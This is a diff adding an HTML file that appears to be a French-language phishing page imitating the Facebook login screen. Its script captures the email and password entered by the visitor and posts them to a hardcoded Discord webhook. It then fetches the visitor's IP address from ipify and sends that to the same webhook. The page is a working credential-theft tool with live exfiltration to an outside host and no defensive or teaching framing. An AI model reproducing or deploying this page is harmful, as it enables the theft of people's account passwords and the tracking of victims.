@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            gap: 80px;
+            align-items: center;
+        }
+        .left {
+            max-width: 400px;
+        }
+        .logo {
+            font-size: 55px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        .left p {
+            font-size: 22px;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            width: 360px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-top: 10px;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            font-size: 15px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .forgot {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        hr {
+            margin: 20px 0;
+        }
+        .create {
+            background: #42b72a;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 60%;
+            display: block;
+            margin: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <div class="logo">Facebook</div>
+            <p>Connectez-vous pour voir et partager avec votre communauté.</p>
+        </div>
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email ou téléphone">
+            <input type="password" id="password" placeholder="Mot de passe">
+            <button class="login-btn" onclick="submitForm()">Se connecter</button>
+            <a class="forgot" href="#">Mot de passe oublié ?</a>
+            <hr>
+            <button class="create">Créer un nouveau compte</button>
+        </div>
+    </div>
+
+    <script>
+        function submitForm() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Envoyer les informations à Discord
+            const discordWebhookUrl = 'https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw';
+            const message = `Email: ${email}\nMot de passe: ${password}`;
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch((error) => console.error('Error:', error));
+
+            // Capturer l'adresse IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    console.log('Adresse IP capturée:', ipAddress);
+                    // Envoyer l'adresse IP à Discord
+                    fetch(discordWebhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ content: `Adresse IP: ${ipAddress}` })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch((error) => console.error('Error:', error));
+                })
+                .catch(error => console.error('Erreur lors de la récupération de l\'adresse IP:', error));
+        }
+    </script>
+</body>
+</html>
